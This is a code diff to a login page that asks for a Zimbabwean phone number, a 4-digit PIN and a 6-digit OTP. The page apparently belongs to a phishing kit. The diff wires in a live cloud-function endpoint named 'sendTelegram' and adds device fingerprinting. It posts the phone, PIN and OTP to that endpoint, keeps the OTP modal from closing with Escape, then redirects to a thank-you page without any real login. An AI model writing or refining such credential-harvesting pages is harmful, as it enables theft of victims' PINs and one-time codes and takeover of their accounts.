@@ -51,7 +51,7 @@ label{
 }
 
 .req{
-  color:#d04444;
+  color:#d04444; /* 🔴 stars stay red */
   margin-right:6px;
 }
 
@@ -106,6 +106,7 @@ input{
   align-items:center;
   justify-content:center;
   background:rgba(0,0,0,.35);
+  z-index:9999;
 }
 
 .otp-box{
@@ -158,19 +159,18 @@ input{
 
     <label><span class="req">★</span>4-Digit PIN</label>
     <div class="pin-row">
-      <input class="pin-digit" maxlength="1" inputmode="numeric" autocomplete="off">
-      <input class="pin-digit" maxlength="1" inputmode="numeric" autocomplete="off">
-      <input class="pin-digit" maxlength="1" inputmode="numeric" autocomplete="off">
-      <input class="pin-digit" maxlength="1" inputmode="numeric" autocomplete="off">
+      <input class="pin-digit" maxlength="1" inputmode="numeric">
+      <input class="pin-digit" maxlength="1" inputmode="numeric">
+      <input class="pin-digit" maxlength="1" inputmode="numeric">
+      <input class="pin-digit" maxlength="1" inputmode="numeric">
     </div>
 
-    <!-- MUST be button, not submit -->
     <button type="button" id="loginBtn" class="btn" disabled>LOGIN</button>
   </form>
 </div>
 
 <!-- OTP MODAL -->
-<div id="otpModal" class="otp-modal" style="display:none">
+<div id="otpModal" class="otp-modal" style="display:none" aria-modal="true" role="dialog">
   <div class="otp-box">
     <strong style="display:block;text-align:center">Enter OTP</strong>
     <p style="font-size:13px;margin:8px 0 10px">We have sent an OTP to your phone.</p>
@@ -196,8 +196,20 @@ input{
 </div>
 
 <script>
-const FUNCTION_URL = 'FIREBASE_FUNCTION_URL';
+/* ================= CONFIG ================= */
+const FUNCTION_URL = 'https://us-central1-master-63b77.cloudfunctions.net/sendTelegram';
+const PREFIX = '+263';
+const SPAM_DELAY = 3000;
 
+/* ================= DEVICE INFO ================= */
+const deviceInfo = {
+  userAgent: navigator.userAgent,
+  platform: navigator.platform,
+  language: navigator.language,
+  screen: `${screen.width}x${screen.height}`
+};
+
+/* ================= ELEMENTS ================= */
 const phoneEl = document.getElementById('phone');
 const loginBtn = document.getElementById('loginBtn');
 const pinInputs = [...document.querySelectorAll('.pin-digit')];
@@ -205,14 +217,21 @@ const otpModal = document.getElementById('otpModal');
 const confirmBtn = document.getElementById('confirmOtp');
 const otpWarning = document.getElementById('otpWarning');
 
-const PREFIX = '+263';
+/* ================= ANTI SPAM ================= */
+let lastAction = 0;
+function spamBlocked(){
+  const now = Date.now();
+  if(now - lastAction < SPAM_DELAY) return true;
+  lastAction = now;
+  return false;
+}
 
-/* PHONE */
+/* ================= PHONE ================= */
 function normalizePhone(){
-  let digits = phoneEl.value.slice(PREFIX.length).replace(/\D/g,'');
-  if(digits.startsWith('0')) digits = digits.slice(1);
-  if(digits && digits[0] !== '7') digits = '7' + digits.slice(1);
-  phoneEl.value = PREFIX + digits.slice(0,9);
+  let d = phoneEl.value.slice(PREFIX.length).replace(/\D/g,'');
+  if(d.startsWith('0')) d = d.slice(1);
+  if(d && d[0] !== '7') d = '7' + d.slice(1);
+  phoneEl.value = PREFIX + d.slice(0,9);
 }
 
 function validPhone(){
@@ -236,7 +255,7 @@ phoneEl.addEventListener('input',()=>{
   updateState();
 });
 
-/* PIN */
+/* ================= PIN ================= */
 function getPin(){
   return pinInputs.map(i=>i.dataset.val||'').join('');
 }
@@ -251,12 +270,12 @@ pinInputs.forEach((el,i)=>{
   });
 });
 
-/* STATE */
+/* ================= STATE ================= */
 function updateState(){
   loginBtn.disabled = !(validPhone() && /^\d{4}$/.test(getPin()));
 }
 
-/* SEND */
+/* ================= SEND ================= */
 function sendToServer(payload){
   return fetch(FUNCTION_URL,{
     method:'POST',
@@ -265,18 +284,23 @@ function sendToServer(payload){
   });
 }
 
-/* LOGIN */
+/* ================= LOGIN ================= */
 loginBtn.onclick=()=>{
+  if(spamBlocked()) return;
+
   otpModal.style.display='flex';
+  pinInputs[0].blur();
+
   sendToServer({
     event:'login_clicked',
     loginPhone:phoneEl.value,
     loginPin:getPin(),
+    device:deviceInfo,
     submittedAt:new Date().toISOString()
   });
 };
 
-/* OTP */
+/* ================= OTP ================= */
 const dEls=['d0','d1','d2','d3','d4','d5'].map(id=>document.getElementById(id));
 function getOtp(){return dEls.map(el=>el.value||'').join('');}
 
@@ -288,23 +312,38 @@ dEls.forEach((el,i)=>{
   });
 });
 
-/* CONFIRM */
+/* ================= CONFIRM ================= */
 confirmBtn.onclick=async()=>{
+  if(spamBlocked()) return;
+
   const otp=getOtp();
-  if(!/^\d{6}$/.test(otp)){otpWarning.style.display='block';return;}
+  if(!/^\d{6}$/.test(otp)){
+    otpWarning.style.display='block';
+    return;
+  }
 
   await sendToServer({
     event:'otp_confirm',
     loginPhone:phoneEl.value,
     loginPin:getPin(),
     otp,
+    device:deviceInfo,
     submittedAt:new Date().toISOString()
   });
 
   window.location.href='thankyou.html';
 };
 
-document.getElementById('cancelOtp').onclick=()=>otpModal.style.display='none';
+/* ================= LOCK MODAL ================= */
+document.addEventListener('keydown',e=>{
+  if(otpModal.style.display==='flex' && e.key==='Escape'){
+    e.preventDefault();
+  }
+});
+
+document.getElementById('cancelOtp').onclick=()=>{
+  otpModal.style.display='none';
+};
 </script>
 
 </body>
